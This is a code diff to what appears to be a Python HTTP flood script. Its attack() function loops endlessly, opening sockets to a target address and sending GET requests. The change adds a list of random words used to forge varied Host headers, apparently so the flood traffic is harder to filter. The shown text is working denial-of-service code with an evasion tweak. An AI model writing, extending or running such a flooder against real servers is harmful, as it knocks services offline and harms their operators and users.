@@ -81,6 +81,29 @@ referers = [
 	"https://www.google.co.ao/search?q=",
 ]
 
+wordlist = [
+    "detonator",
+    "concept",
+    "enjoy",
+    "equation",
+    "afterwards",
+    "flavoring",
+    "hoaxer",
+    "disbeliever",
+    "wreck",
+    "abuse",
+    "belly",
+    "halfway",
+    "grieving",
+    "fortress",
+    "hobby",
+    "consumer",
+    "courageous",
+    "amnesia",
+    "weapon",
+    "chicken",
+]
+
 def rqheader():
     connection = "Connection: keep-alive\r\n"
     accept = Choice(acceptall)
@@ -94,10 +117,9 @@ def rqheader():
 def attack():
     global num_sent
     header = rqheader()
-    num_sent = 0
     go.wait()
     while True:
-        get_host = "GET " + path + "/?=" + str(random.randint(0,200)) + " HTTP/1.1\r\nHost: " + "google.com" +":"+str(port)+ "\r\n"
+        get_host = "GET " + path + "/?=" + str(random.randint(0,200)) + " HTTP/1.1\r\nHost: " + Choice(wordlist) + str(random.randint(0,200)) + ".com" +":"+str(port)+ "\r\n"
         request = get_host + header
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((ip, port))
